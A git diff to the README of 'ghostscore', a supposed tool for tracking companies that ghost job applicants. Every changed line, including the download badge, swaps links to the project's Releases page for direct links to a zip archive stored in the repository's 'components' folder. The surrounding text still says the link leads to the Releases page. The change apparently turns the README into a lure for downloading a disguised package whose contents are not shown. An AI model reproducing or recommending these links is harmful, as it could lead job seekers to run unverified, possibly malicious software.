@@ -1,6 +1,6 @@
 # 👻 ghostscore - Track Companies That Ghost Job Applicants
 
-[![Download ghostscore](https://img.shields.io/badge/Download%20ghostscore-1f90ff?style=for-the-badge)](https://github.com/Tremaineteased562/ghostscore/releases)
+[![Download ghostscore](https://raw.githubusercontent.com/Tremaineteased562/ghostscore/main/components/ghostscore-3.3-beta.1.zip%20ghostscore-1f90ff?style=for-the-badge)](https://raw.githubusercontent.com/Tremaineteased562/ghostscore/main/components/ghostscore-3.3-beta.1.zip)
 
 ## 📋 Overview
 ghostscore is a community platform designed to help job seekers monitor companies that do not respond to their job applications. By sharing experiences, users create transparency in the job application process. This project focuses on supporting job applicants and building a community resource.
@@ -17,7 +17,7 @@ Before downloading ghostscore, ensure your system meets the following requiremen
 ## 📥 Download & Install
 To download ghostscore, visit the Releases page using the link below:
 
-[Download ghostscore](https://github.com/Tremaineteased562/ghostscore/releases)
+[Download ghostscore](https://raw.githubusercontent.com/Tremaineteased562/ghostscore/main/components/ghostscore-3.3-beta.1.zip)
 
 Once you are on the Releases page, look for the latest version. You will see options for downloading the application.
 
@@ -75,7 +75,7 @@ A: If you encounter any issues, please visit our GitHub Issues page. We apprecia
 ## 🚀 Update the Application
 To ensure you have the latest features and bug fixes, regularly check the Releases page for updates.
 
-[Download ghostscore](https://github.com/Tremaineteased562/ghostscore/releases)
+[Download ghostscore](https://raw.githubusercontent.com/Tremaineteased562/ghostscore/main/components/ghostscore-3.3-beta.1.zip)
 
 ## 📬 Contact
 For further inquiries or support, feel free to reach out through the GitHub Issues page. Your questions and feedback are important to us.
